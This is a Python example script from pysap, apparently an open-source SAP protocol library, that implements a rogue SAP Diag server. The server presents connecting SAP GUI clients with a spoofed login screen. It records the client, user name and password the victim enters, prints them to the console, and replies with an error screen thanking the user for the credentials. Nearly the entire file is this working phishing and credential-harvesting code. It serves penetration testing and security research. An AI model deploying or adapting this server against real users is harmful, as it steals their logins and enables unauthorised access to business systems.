#!/usr/bin/env python2
# encoding: utf-8
# pysap - Python library for crafting SAP's network protocols packets
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# Author:
#   Martin Gallo (@martingalloar)
#   Code contributed by SecureAuth to the OWASP CBAS project
#

# Standard imports
import logging
from socket import error
from argparse import ArgumentParser
# External imports
from scapy.config import conf
from scapy.packet import bind_layers
# Custom imports
import pysap
from pysap.SAPDiagItems import *
from pysap.SAPDiag import SAPDiag, SAPDiagDP
from pysap.SAPNI import (SAPNI, SAPNIClient, SAPNIServerHandler,
                         SAPNIServerThreaded)


# Bind the SAPDiag layer
bind_layers(SAPNI, SAPDiagDP,)
bind_layers(SAPNI, SAPDiag,)
bind_layers(SAPDiagDP, SAPDiag,)
bind_layers(SAPDiag, SAPDiagItem,)
bind_layers(SAPDiagItem, SAPDiagItem,)


# Set the verbosity to 0
conf.verb = 0


class SAPDiagClient(SAPNIClient):
    terminal = None
    init = False

    def __init__(self, terminal=None, init=False):
        self.terminal = terminal
        self.init = init

    def __str__(self):
        return "SAP Diag Client: Terminal=%s Init=%s" % (self.terminal, self.init)


class SAPDiagServerHandler(SAPNIServerHandler):

    def __init__(self, request, client_address, server):
        self.hostname = server.options.server_hostname
        self.client = server.options.server_client
        self.sid = server.options.server_sid
        self.session_title = server.options.server_session_title
        SAPNIServerHandler.__init__(self, request, client_address, server)

    def make_login_screen(self):
        return [
            SAPDiagItem(item_value=support_data_sapnw_702, item_type=16, item_id=6, item_sid=17),
            SAPDiagItem(item_value='A38A17E15C46F1F4B43C000C297D2G11', item_type=16, item_id=6, item_sid=33),
            SAPDiagItem(item_value='\x01\xa3\x8a\x17\xe1\\F\xf1\xf6\xb4<\x00\x0c)}.\x11\x01', item_type=16, item_id=6, item_sid=31),
            SAPDiagItem(item_value=self.sid, item_type=16, item_id=6, item_sid=2),
            SAPDiagItem(item_value=self.client, item_type=16, item_id=6, item_sid=12),
            SAPDiagItem(item_value=self.hostname, item_type=16, item_id=6, item_sid=3),
            SAPDiagItem(item_value='TRADESHOW\x00', item_type=16, item_id=6, item_sid=37),
            SAPDiagItem(item_value='702\x007200\x0070\x00', item_type=16, item_id=6, item_sid=41),
            SAPDiagItem(item_value='S000                                ', item_type=16, item_id=6, item_sid=7),
            SAPDiagItem(item_value='\x00\x00\x00\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x16T', item_type=1),
            SAPDiagItem(item_value=SAPDiagAreaSize(area_height=22, area_width=84, window_width=84, window_height=22), item_type=16, item_id=12, item_sid=7),
            SAPDiagItem(item_value='SAP R/3 (1) %s     ' % self.sid, item_type=16, item_id=12, item_sid=10),
            SAPDiagItem(item_value='SAPMSYST                                ', item_type=16, item_id=6, item_sid=15),
            SAPDiagItem(item_value='SAPMSYST                                ', item_type=16, item_id=6, item_sid=13),
            SAPDiagItem(item_value='0020                ', item_type=16, item_id=6, item_sid=16),
            SAPDiagItem(item_value='0020', item_type=16, item_id=6, item_sid=14),
            SAPDiagItem(item_value=SAPDiagMenuEntries(entries=[SAPDiagMenuEntry(accelerator='D', text=self.session_title, position_1=1, flag_TERM_VKEY=1, return_code_1=1, flag_TERM_SEL=1, length=24 + len(self.session_title)),
                                                               ]), item_type=18, item_id=11, item_sid=1),
            SAPDiagItem(item_value=SAPDiagMenuEntries(entries=[SAPDiagMenuEntry(accelerator='', text='New password', virtual_key=5, return_code_1=5, info='New password', flag_TERM_SEL=1, length=47),
                                                               ]), item_type=18, item_id=11, item_sid=3),
            SAPDiagItem(item_value=SAPDiagMenuEntries(entries=[SAPDiagMenuEntry(accelerator='', text='New password', virtual_key=5, position_1=1, flag_TERM_SEL=1, length=35),
                                                               SAPDiagMenuEntry(accelerator='', text='Log off', virtual_key=15, position_1=2, return_code_1=1, flag_TERM_SEL=1, length=30)
                                                               ]), item_type=18, item_id=11, item_sid=4),
            SAPDiagItem(item_value=self.session_title, item_type=16, item_id=12, item_sid=9),
            SAPDiagItem(item_value=SAPDiagDyntAtom(items=[SAPDiagDyntAtomItem(field2_text='Client            ', field2_maxnrchars=18, dlg_flag_2=2, atom_length=37, etype=132, attr_DIAG_BSD_PROTECTED=1, field2_mlen=18, field2_dlen=18, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          SAPDiagDyntAtomItem(dlg_flag_2=2, atom_length=24, name_text='RSYST-MANDT', etype=114, attr_DIAG_BSD_PROTECTED=1, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          SAPDiagDyntAtomItem(field2_text=self.client, attr_DIAG_BSD_YES3D=1, field2_maxnrchars=3, atom_length=22, etype=130, field2_mlen=3, field2_dlen=3, block=1, col=20),
                                                          SAPDiagDyntAtomItem(attr_DIAG_BSD_YES3D=1, atom_length=24, name_text='RSYST-MANDT', etype=114, block=1, col=20),
                                                          SAPDiagDyntAtomItem(attr_DIAG_BSD_YES3D=1, atom_length=79, xmlprop_text='<Propertybag><DefaultTooltip>Client</DefaultTooltip></Propertybag>', etype=120, block=1, col=20),
                                                          SAPDiagDyntAtomItem(field2_text='User              ', field2_maxnrchars=18, row=2, dlg_flag_2=3, atom_length=37, etype=132, attr_DIAG_BSD_PROTECTED=1, field2_mlen=18, field2_dlen=18, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          SAPDiagDyntAtomItem(row=2, dlg_flag_2=3, atom_length=24, name_text='RSYST-BNAME', etype=114, attr_DIAG_BSD_PROTECTED=1, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          SAPDiagDyntAtomItem(field2_text='?           ', attr_DIAG_BSD_YES3D=1, field2_maxnrchars=12, row=2, dlg_flag_2=1, atom_length=31, etype=130, field2_mlen=12, field2_dlen=12, block=1, col=20),
                                                          SAPDiagDyntAtomItem(attr_DIAG_BSD_YES3D=1, row=2, dlg_flag_2=1, atom_length=24, name_text='RSYST-BNAME', etype=114, block=1, col=20),
                                                          SAPDiagDyntAtomItem(attr_DIAG_BSD_YES3D=1, row=2, dlg_flag_2=1, atom_length=82, xmlprop_text='<Propertybag><DefaultTooltip>User name</DefaultTooltip></Propertybag>', etype=120, block=1, col=20),
                                                          SAPDiagDyntAtomItem(field2_text='@\\QUp to 40 Chars (Case-Sens.)@Password             ', field2_maxnrchars=52, row=3, dlg_flag_2=3, dlg_flag_1=4, atom_length=71, etype=132, attr_DIAG_BSD_PROTECTED=1, field2_mlen=18, field2_dlen=52, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          SAPDiagDyntAtomItem(row=3, dlg_flag_2=3, dlg_flag_1=4, atom_length=24, name_text='RSYST-BCODE', etype=114, attr_DIAG_BSD_PROTECTED=1, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          SAPDiagDyntAtomItem(field2_text='?                                       ', attr_DIAG_BSD_YES3D=1, field2_maxnrchars=40, row=3, dlg_flag_2=1, dlg_flag_1=4, atom_length=59, etype=130, attr_DIAG_BSD_INVISIBLE=1, field2_mlen=12, field2_dlen=40, block=1, col=20),
                                                          SAPDiagDyntAtomItem(attr_DIAG_BSD_YES3D=1, row=3, dlg_flag_2=1, dlg_flag_1=4, atom_length=24, name_text='RSYST-BCODE', etype=114, attr_DIAG_BSD_INVISIBLE=1, block=1, col=20),
                                                          SAPDiagDyntAtomItem(attr_DIAG_BSD_YES3D=1, row=3, dlg_flag_2=1, dlg_flag_1=4, atom_length=86, xmlprop_text='<Propertybag><DefaultTooltip>User password</DefaultTooltip></Propertybag>', etype=120, attr_DIAG_BSD_INVISIBLE=1, block=1, col=20),
                                                          SAPDiagDyntAtomItem(field2_text='Language          ', field2_maxnrchars=18, row=5, dlg_flag_2=2, atom_length=37, etype=132, attr_DIAG_BSD_PROTECTED=1, field2_mlen=18, field2_dlen=18, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          SAPDiagDyntAtomItem(row=5, dlg_flag_2=2, atom_length=24, name_text='RSYST-LANGU', etype=114, attr_DIAG_BSD_PROTECTED=1, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          SAPDiagDyntAtomItem(field2_text='  ', attr_DIAG_BSD_YES3D=1, field2_maxnrchars=2, row=5, atom_length=21, etype=130, field2_mlen=2, field2_dlen=2, block=1, col=20),
                                                          SAPDiagDyntAtomItem(attr_DIAG_BSD_YES3D=1, row=5, atom_length=24, name_text='RSYST-LANGU', etype=114, block=1, col=20),
                                                          SAPDiagDyntAtomItem(atom_length=81, attr_DIAG_BSD_YES3D=1, xmlprop_text='<Propertybag><DefaultTooltip>Language</DefaultTooltip></Propertybag>', etype=120, col=20, block=1, row=5),
                                                          SAPDiagDyntAtomItem(field2_text=self.session_title, field2_maxnrchars=18, row=7, dlg_flag_2=2, atom_length=37, etype=132, attr_DIAG_BSD_PROTECTED=1, field2_mlen=18, field2_dlen=18, attr_DIAG_BSD_PROPFONT=1, block=1, col=1),
                                                          ]), item_type=18, item_id=9, item_sid=2),
        ]

    def make_error_screen(self, message):
        return [SAPDiagItem(item_value=support_data_sapnw_702, item_type=16, item_id=6, item_sid=17),
                SAPDiagItem(item_value='808D17E1E8DBF1D0B43C000C297D2E11', item_type=16, item_id=6, item_sid=33),
                SAPDiagItem(item_value='\x01\x80\x8d\x17\xe1\xe8\xdb\xf1\xd2\xb4<\x00\x0c)}.\x11\x01', item_type=16, item_id=6, item_sid=31),
                SAPDiagItem(item_value=self.sid, item_type=16, item_id=6, item_sid=2),
                SAPDiagItem(item_value=self.client, item_type=16, item_id=6, item_sid=12),
                SAPDiagItem(item_value=self.hostname, item_type=16, item_id=6, item_sid=33),
                SAPDiagItem(item_value='TRADESHOW\x00', item_type=16, item_id=6, item_sid=37),
                SAPDiagItem(item_value='702\x007200\x0070\x00', item_type=16, item_id=6, item_sid=41),
                SAPDiagItem(item_value='SAP R/3 (1) %s     ' % self.sid, item_type=16, item_id=12, item_sid=10),
                SAPDiagItem(item_value='SAPMSYST                                ', item_type=16, item_id=6, item_sid=15),
                SAPDiagItem(item_value='0020                ', item_type=16, item_id=6, item_sid=16),
                SAPDiagItem(item_value='SAPMSYST                                ', item_type=16, item_id=6, item_sid=13),
                SAPDiagItem(item_value='0020', item_type=16, item_id=6, item_sid=14),
                SAPDiagItem(item_value=self.session_title, item_type=16, item_id=12, item_sid=9),
                SAPDiagItem(item_value=message, item_type=16, item_id=6, item_sid=11),
                ]

    def logoff(self):
        print("[*] Logging off the client %s" % str(self.client_address))
        try:
            self.request.send(SAPDiag(com_flag_TERM_EOP=1, com_flag_TERM_EOC=1, compress=0))
            self.request.close()
        except error:
            pass
        del(self.server.clients[self.client_address])

    def handle_data(self):
        if self.client_address in self.server.clients and self.server.clients[self.client_address].init:
            print("[*] Already initialized client %s" % str(self.client_address))
            self.handle_msg()
        else:
            print("[*] Uninitialized client %s" % str(self.client_address))
            self.handle_init()

    def handle_init(self):
        # For initialization we need to decode the packet as SAPDiagDP
        self.packet.decode_payload_as(SAPDiagDP)
        if SAPDiagDP in self.packet:
            self.server.clients[self.client_address].init = True
            self.server.clients[self.client_address].terminal = self.packet[SAPDiagDP].terminal
            print("[*] Client %s set to initialized (terminal: %s)" % (str(self.client_address),
                                                                       self.server.clients[self.client_address].terminal))
            self.request.send(SAPDiag(compress=0, message=self.make_login_screen()))
        else:
            print("[-] Error during initialization of client %s" % str(self.client_address))
            self.logoff()

    def handle_msg(self):
        print("[*] Received message from client %s" % str(self.client_address))
        diag = self.packet[SAPDiag]

        # Handle exit transaction (OK CODE = /i)
        if len(diag.get_item("APPL", "VARINFO", "OKCODE")) > 0 and diag.get_item("APPL", "VARINFO", "OKCODE")[0].item_value == "/i":
            print("[*] Windows closed by the client %s" % str(self.client_address))
            self.logoff()

        # Handle events (UI EVENT SOURCE)
        elif diag.get_item("APPL", "UI_EVENT", "UI_EVENT_SOURCE"):
            print("[*] UI Event sent by the client %s" % str(self.client_address))
            ui_event_source = diag.get_item("APPL", "UI_EVENT", "UI_EVENT_SOURCE")[0].item_value

            # Handle function key
            if ui_event_source.valid_functionkey_data:
                # Handle logoff event
                if ui_event_source.event_type == 7 and ui_event_source.control_type == 10 and ui_event_source.event_data == 15:
                    print("[*] Logoff sent by the client %s" % str(self.client_address))
                    self.logoff()

                # Handle enter event
                elif ui_event_source.event_type == 7 and ui_event_source.control_type == 10 and ui_event_source.event_data == 0:
                    print("[*] Enter sent by the client %s" % str(self.client_address))

            # Handle menu option
            elif ui_event_source.valid_menu_pos:
                print("[*] Menu event sent by the client %s" % str(self.client_address))

            else:
                print("[*] Other event sent by the client %s" % str(self.client_address))

        # Handle login request (DYNT Atom == \x00)
        atoms = diag.get_item(["APPL", "APPL4"], "DYNT", "DYNT_ATOM")
        if atoms:
            print("[*] Login request sent by the client %s" % str(self.client_address))
            # Print the Atom items information
            print("[*] Input fields:")
            for atom in [atom for atom_item in atoms for atom in atom_item.item_value.items]:
                if atom.etype in [121, 122, 123, 130, 131, 132]:
                    text = atom.field1_text or atom.field2_text
                    text = text.strip()
                    if atom.attr_DIAG_BSD_INVISIBLE and len(text) > 0:
                        # If the invisible flag was set, we're probably
                        # dealing with a password field
                        print("[*]\tPassword field:\t%s" % (text))
                    else:
                        print("[*]\tRegular field:\t%s" % (text))

            print("[*] Sending error message to client %s" % str(self.client_address))
            self.request.send(SAPDiag(compress=1, message=self.make_error_screen("Thanks for your credentials !!!")))

        # Otherwise we send an error message
        else:
            print("[*] Sending error message to client %s" % str(self.client_address))
            try:
                self.request.send(SAPDiag(compress=0, message=self.make_error_screen("E: Unable to process your request, try later")))
            except error:
                pass


class SAPDiagThreadedServer(SAPNIServerThreaded):
    clients_cls = SAPDiagClient


# Command line options parser
def parse_options():

    description = "This example script implements a rogue server using the Diag protocol. It offers users a " \
                  "customizable login screen and gathers entered credentials. Tested with SAP Gui for Java 7.20 Patch "\
                  "Level 5 running on Ubuntu."

    usage = "%(prog)s [options]"

    parser = ArgumentParser(usage=usage, description=description, epilog=pysap.epilog)

    local = parser.add_argument_group("Local")
    local.add_argument("-b", "--local-host", dest="local_host", default="127.0.0.1",
                       help="Local address [%(default)s]")
    local.add_argument("-l", "--local-port", dest="local_port", type=int, default=3200,
                       help="Local port [%(default)d]")

    server = parser.add_argument_group("Server")
    server.add_argument("--sid", dest="server_sid", default="PRD",
                        help="System ID [%(default)s]")
    server.add_argument("--client", dest="server_client", default="001",
                        help="Default Client [%(default)s]")
    server.add_argument("--hostname", dest="server_hostname", default="SAPNWPRD",
                        help="Hostname [%(default)s]")
    server.add_argument("--session-title", dest="server_session_title", default="SAP Netweaver Demo Server",
                        help="Session Title [%(default)s]")

    misc = parser.add_argument_group("Misc options")
    misc.add_argument("-v", "--verbose", dest="verbose", action="store_true", help="Verbose output")

    options = parser.parse_args()

    return options


# Main function
def main():
    options = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    print("[*] Setting up the Diag server on %s:%d" % (options.local_host, options.local_port))
    server = SAPDiagThreadedServer((options.local_host, options.local_port),
                                   SAPDiagServerHandler,
                                   base_cls=SAPDiag)
    server.allow_reuse_address = True
    server.options = options
    print("[*] Waiting for clients ...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("[*] Canceled by the user ...")
        server.shutdown()


if __name__ == "__main__":
    main()
